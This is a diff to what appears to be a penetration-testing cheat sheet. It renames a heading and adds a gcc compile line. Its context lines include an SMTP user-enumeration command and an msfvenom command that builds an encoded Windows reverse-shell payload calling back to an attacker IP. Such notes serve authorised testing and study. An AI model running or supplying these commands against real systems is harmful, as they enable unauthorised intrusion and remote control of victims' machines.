@@ -105,9 +105,13 @@ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 ```
 
-#### Cross-Compiling for Windows from Linux
+#### Compiling Code From Linux
 ```bash
+# Windows
 i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
+
+# Linux
+gcc -m32|-m64 -o output source.c
 ```
 
 
